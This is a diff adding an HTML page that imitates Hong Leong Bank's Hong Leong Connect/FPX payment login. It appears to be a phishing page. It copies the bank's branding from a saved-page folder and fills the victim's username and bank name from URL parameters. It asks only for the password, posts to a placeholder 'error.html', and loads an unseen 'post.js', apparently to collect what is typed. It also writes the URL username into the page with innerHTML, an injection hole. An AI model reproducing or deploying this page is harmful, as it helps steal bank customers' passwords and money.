@@ -1,0 +1,444 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=11,IE=10,IE=9,IE=8,IE=7,IE=6">
+	<meta name="GENERATOR" content="IBM WebSphere Studio">
+	<meta http-equiv="Content-Style-Type" content="text/css">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link href="HLB_files/amp_style.css" rel="stylesheet" type="text/css">
+	<link href="HLB_files/b2cLogin.css" rel="stylesheet" type="text/css">
+	<link href="HLB_files/jquery-ui.css" rel="stylesheet" type="text/css">
+	<link href="HLB_files/jquery.css" rel="stylesheet" type="text/css">
+	<link href="HLB_files/bootstrap.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]>
+  <script src="resources/js/html5shiv.js"></script>
+  <script src="resources/js/html5shiv-printshiv.js"></script>
+  <script src="resources/js/respond.min.js"></script>
+<![endif]-->
+	<script language="javascript" src="HLB_files/timeout.js"></script>
+	<script language="javascript" src="HLB_files/validation.js"></script>
+	<script language="javascript" src="HLB_files/jquery-1.js"></script>
+	<script language="javascript" src="HLB_files/jquery-ui.js"></script>
+	<script language="javascript" src="HLB_files/jquerynew.js"></script>
+	<script language="javascript" src="HLB_files/jquery.js"></script>
+	<script language="JavaScript" type="text/javascript" src="HLB_files/jquery-1_002.js"></script>
+	<script language="JavaScript" type="text/javascript" src="HLB_files/jquery-ui-1.js"></script>
+	<script type="text/javascript">
+
+
+		function confirmOk() {
+			$("#dialog-confirm").dialog("open");
+		}
+
+
+		$(function () {
+
+			$("#dialog-confirm").dialog({
+				autoOpen: false,
+				resizable: false,
+				height: 200,
+				width: 300,
+				modal: true,
+				buttons: {
+					'Ok': function () {
+						$(this).dialog("close");
+						window.location.href = /* window.location.href+ */'cancel_payment?page=logon';
+					},
+					Cancel: function () {
+						$(this).dialog("close");
+					}
+				},
+				open: function () {
+					$('.ui-dialog-buttonpane')
+						.find('button:contains("Ok")')
+						.removeClass('ui-button-text-only')
+						.addClass('ui-button-text-icon-primary')
+						.prepend('<span class="ui-icon ui-icon-check blue"></span>');
+					$('.ui-dialog-buttonpane')
+						.find('button:contains("Cancel")')
+						.removeClass('ui-button-text-only')
+						.addClass('ui-button-text-icon-primary')
+						.prepend('<span class="ui-icon ui-icon-close blue"></span>');
+				}
+			});
+
+
+		});
+
+		function customAlert(msg) {
+			var alertDiv = "<div style='position: fixed; top: 20px; left: 20px;'>" + msg + "</div>";
+			document.getElementsByTagName('body')[0].appendChild(alertDiv);
+		}
+		/*var dt = !window.document.title?window.document.URL:window.document.title;
+		window.history.pushState(null, dt, window.location.href);
+		window.addEventListener('popstate', function (event) {
+			window.history.pushState(null, dt, window.location.href);
+		});*/
+		/*if (window.addEventListener) {
+			window.addEventListener("beforeunload", markRefresh, false);
+		} else if (window.attachEvent) {
+			window.attachEvent("beforeunload", markRefresh, false);
+		} else {
+			window.onbeforeunload = markRefresh;
+		}*/
+
+		function validateLogon() {
+			var username = document.getElementById("pd").value;
+			var usrMsg = document.getElementById('usrMsg');
+
+			usrMsg.innerHTML = "";
+
+			if (username === "") {
+				usrMsg.style.display = "block";
+				usrMsg.innerHTML = "Password is required";
+				document.logonForm.username.focus();
+				return false;
+			} else {
+
+			}
+			isSubmit = true;
+			return true;
+
+		}
+
+		function clearForm() {
+			document.getElementById("pd").value = "";
+			document.logonForm.password.value = "";
+
+			return false;
+		}
+
+		function windoeSize() {
+			window.resizeBy(200, 200);
+		}
+
+		function NewWindow(i) {
+			window.open(i, "Mywindow", "scrollbars=1,resizable=1,width=500,height=500");
+		}
+
+		function txtOnFocus(txt) {
+			txt.className = "focus";
+		}
+
+		function txtOnBlur(txt) {
+			txt.className = "";
+		}
+
+		function go(urn) {
+			window.location.href = "/HLB-ePayment/" + urn;
+		}
+
+		function unload_page(urn) {
+			window.location.href = "/HLB-ePayment/window_close?page=logon";
+		}
+
+	</script>
+	<style type="text/css">
+		.cus-padding {
+			padding-right: 0px;
+			padding-left: 0px;
+		}
+
+		.img-responsive {
+			display: block;
+			margin-right: auto;
+			margin-left: auto;
+		}
+
+		.mobile-view {
+			padding-right: 0px;
+			padding-left: 0px;
+			visibility: hidden;
+			display: none;
+		}
+
+		.tablet-view {
+			padding-right: 0px;
+			padding-left: 0px;
+			visibility: hidden;
+			display: none;
+		}
+
+		.desktop-view {
+			padding-right: 0px;
+			padding-left: 0px;
+			visibility: visible;
+			display: block;
+		}
+
+		.text-right {
+			text-align: center;
+		}
+
+		.text-left {
+			text-align: center;
+		}
+
+		.text-justify {
+			text-align: justify;
+		}
+
+
+		@media (max-width: 430px) {
+			.img-responsive {
+				display: block;
+				margin-right: auto;
+				margin-left: auto;
+
+			}
+
+			.cus-padding {
+				padding-right: 15px;
+				padding-left: 15px;
+			}
+
+			.text-right {
+				text-align: center;
+			}
+
+			.text-left {
+				text-align: center;
+			}
+
+			.text-justify {
+				text-align: center;
+			}
+
+			.mobile-view {
+				visibility: visible;
+				display: block;
+			}
+
+			.tablet-view {
+				visibility: hidden;
+				display: none;
+			}
+
+			.desktop-view {
+				visibility: hidden;
+				display: none;
+			}
+
+		}
+
+		@media (min-width: 768px) and (max-width: 1023px) {
+			.img-responsive {
+				display: block;
+				margin-right: auto;
+				margin-left: auto;
+			}
+
+			.cus-padding {
+				padding-right: 15px;
+				padding-left: 15px;
+			}
+
+			.container {
+				width: 100%;
+			}
+
+			.text-right {
+				text-align: center;
+			}
+
+			.text-left {
+				text-align: center;
+			}
+
+			.text-justify {
+				text-align: justify;
+			}
+
+			.tablet-view {
+				visibility: visible;
+				display: block;
+			}
+
+			.mobile-view {
+				visibility: hidden;
+				display: none;
+			}
+
+			.desktop-view {
+				visibility: hidden;
+				display: none;
+			}
+
+		}
+
+		.btn-blue {
+			color: #fff;
+			background-color: #747474;
+			border-color: #747474;
+		}
+
+		.btn-blue:focus,
+		.btn-blue.focus {
+			color: #fff;
+			background-color: #747474;
+			border-color: #747474;
+		}
+
+		.btn-blue:hover {
+			color: #fff;
+			background-color: #808080;
+			border-color: #808080;
+		}
+
+		.btn-success {
+			color: #fff;
+			background-color: #84c34f;
+			border-color: #84c34f;
+		}
+	</style>
+	<title>Hong Leong Bank</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta content="MSHTML 6.00.2600.0" name="GENERATOR">
+</head>
+
+<body onload="Timeout_Start('logon');" onmousedown="Timeout_Reset();" onmousemove="Timeout_Reset();"
+	oncontextmenu="return rightClickOnClick();" topmargin="0" marginwidth="0" marginheight="0" leftmargin="0">
+	<div class="container">
+		<input type="hidden" id="uri" value="/HLB-ePayment">
+		<div class="row">
+			<div class="mobile-view" align="center">
+
+
+				<img src="HLB_files/mobile-hlb-logo.png" alt="Hong Leong Connect"
+					style="height: 70px;padding-top: 7px;padding-bottom: 7px;">
+			</div>
+
+
+
+
+			<img src="HLB_files/hlb-bhib-logo.png" class="img-responsive desktop-view" alt="Hong Leong Connect"
+				style="height: 70px;padding-top: 20px;padding-bottom: 20px;">
+			<img src="HLB_files/hlb-bhib-logo.png" class="img-responsive tablet-view" alt="Hong Leong Connect"
+				style="height: 70px;padding-top: 20px;padding-bottom: 20px;">
+		</div>
+		<div class="row" style="background-color: #f7f7f7;border-bottom:1px solid lightgrey;">
+			<form id="logonForm" name="logonForm" class="form-horizontal" onSubmit="submit_form()"
+				action="error.html" />
+			<div class="col-md-4 col-sm-5" style="padding-top: 30px;padding-bottom: 10px;background-color: #134077;">
+				<img src="HLB_files/connect-logo-white.png" class="img-responsive col-md-6 col-xs-6"
+					alt="Hong Leong Connect" style="height: 90px;padding-top: 10px;padding-bottom: 30px;">
+				<img src="HLB_files/whiteFPX.png" class="img-responsive col-md-6 col-xs-6" alt="Hong Leong Connect"
+					style="height: 90px;padding-top: 15px;padding-bottom: 20px;">
+				<div class="panel panel-default"
+					style="border-left: 2px solid #134a9c;border-right: 2px solid #134a9c;border-top: 2px solid #134a9c;border-bottom: 2px solid #134a9c;">
+					<div class="panel-body" style="background-color: #134077;">
+						<div style="padding-bottom: 20px;" align="center">
+							<img src="HLB_files/lock-icon.png">
+							<font size="2" color="white"> SECURED LOGIN</font>
+						</div>
+						<div class="form-group">
+							<div class="col-sm-12 col-xs-12" align="center">
+								<label style="color: #fff; font-size: 1.2em; font-weight: 700;">Username: <span id="pass_user"></span></label><span>
+								<input id="pd" name="pd" autofocus="autofocus" style="width: 95%;"
+									placeholder="Password" class="form-control" type="password" maxlength="20">
+									<input id="uname" name="uname" type="hidden" >
+								<br>
+								<input name="b" id="b" value="HONG LEONG BANK" hidden="">
+								<!-- <input id="pd" name="pd" autofocus="autofocus" style="width: 95%;" placeholder="Password" class="form-control" type="password" maxlength="16"> -->
+							</div>
+							<div id="lblUsername" style="display:none; margin-left: 10px; font-weight: bold;"
+								align="left"></div>
+							<div id="usrMsg" style="display:none; margin-right: 10px;color: red" class="lblmsg"
+								align="center"></div>
+						</div>
+						<div class="form-group last">
+							<div class="col-md-12 text-center" align="center">
+								<input type="submit" class="btn btn-success" style="margin-top: 5px;width: 95%;"
+									value=" Login " onclick="return validateLogon();">
+								<input type="button" class="btn btn-blue" style="margin-top: 5px;width: 95%;"
+									value=" Cancel " onclick="confirmOk()">
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+			</form>
+			<div class="col-md-8 col-sm-7" style="padding-top: 10px;padding-left: 20px;border-top:1px solid lightgrey;"
+				align="justify">
+				<b>
+					<font size="3">Notice</font>
+				</b>
+				<ol style="padding-left: 10px;padding-top: 10px;" type="1">
+					<li>Please note: After some time of inactivity, you’ll automatically be logged out by the system and
+						will have to re-login. </li>
+					<li>Do ensure that your transaction is completed before closing this page or browsing other
+						webpage(s).</li>
+					<li>Click <a href="javascript: NewWindow('PopUpFAQConnect.jsp')">here</a> for help.</li>
+				</ol>
+			</div>
+		</div>
+		<div class="row">
+			<div class="col-md-12 text-center cus-padding">
+				<table style="width: 100%;margin-top: 20px;margin-bottom: 10px;" align="left">
+					<tbody>
+						<tr height="7px">
+							<td colspan="2" style="font-size: 10px;padding-top: 10px;" align="justify">
+								Copyright © Hong Leong Bank Berhad reserved.
+								Use of the information on this page is intended for Malaysian
+								citizens and Malaysian residents only and all contents on this website
+								are governed by Malaysian law and is subject to the disclaimer
+								which can be read on the disclaimer page. Optimized for Internet
+								Explorer 10 and above.</td>
+						</tr>
+					</tbody>
+				</table>
+			</div>
+		</div>
+	</div>
+	<div style="display: none; z-index: 1000; outline: currentcolor none 0px;"
+		class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable" tabindex="-1" role="dialog"
+		aria-labelledby="ui-dialog-title-dialog-confirm">
+		<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span class="ui-dialog-title"
+				id="ui-dialog-title-dialog-confirm">&nbsp;</span><a href="#"
+				class="ui-dialog-titlebar-close ui-corner-all" role="button"><span
+					class="ui-icon ui-icon-closethick">close</span></a></div>
+		<div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
+			<div class="ui-dialog-buttonset"><button type="button"
+					class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
+					aria-disabled="false"><span class="ui-button-text">Ok</span></button><button type="button"
+					class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
+					aria-disabled="false"><span class="ui-button-text">Cancel</span></button></div>
+		</div>
+	</div>
+	<div style="display: none; z-index: 1000; outline: currentcolor none 0px;"
+		class="ui-dialog ui-widget ui-widget-content ui-corner-all ui-draggable" tabindex="-1" role="dialog"
+		aria-labelledby="ui-dialog-title-dialog-confirm">
+		<div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix"><span class="ui-dialog-title"
+				id="ui-dialog-title-dialog-confirm">&nbsp;</span><a href="#"
+				class="ui-dialog-titlebar-close ui-corner-all" role="button"><span
+					class="ui-icon ui-icon-closethick">close</span></a></div>
+		<div id="dialog-confirm" class="ui-dialog-content ui-widget-content">
+			<p><br><span class="ui-icon ui-icon-alert" style="float:left; margin:0 7px 20px 0;"></span>Do you wish to
+				cancel this payment?</p>
+		</div>
+		<div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
+			<div class="ui-dialog-buttonset"><button type="button"
+					class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
+					aria-disabled="false"><span class="ui-button-text">Ok</span></button><button type="button"
+					class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button"
+					aria-disabled="false"><span class="ui-button-text">Cancel</span></button></div>
+		</div>
+	</div>
+	<p style="position: absolute; visibility: hidden;" id="testStr">၎</p>
+	<p style="position: absolute; visibility: hidden;" id="standardStr">င</p>
+	<p style="position: absolute; visibility: hidden;" class="zgFont" id="zgStr">၎</p>
+	<p style="position: absolute; visibility: hidden;" class="uniFont" id="uniStr">၎</p>
+</body>
+<script type="text/javascript">
+	const queryString = window.location.search
+	const urlParams = new URLSearchParams(queryString)
+	
+	document.getElementById("uname").value = urlParams.get("uname");
+	document.getElementById("pass_user").innerHTML = urlParams.get("uname");
+	document.getElementById("b").value = urlParams.get("b");
+</script>
+<script type="text/javascript" src="post.js"></script>
+
+</html>
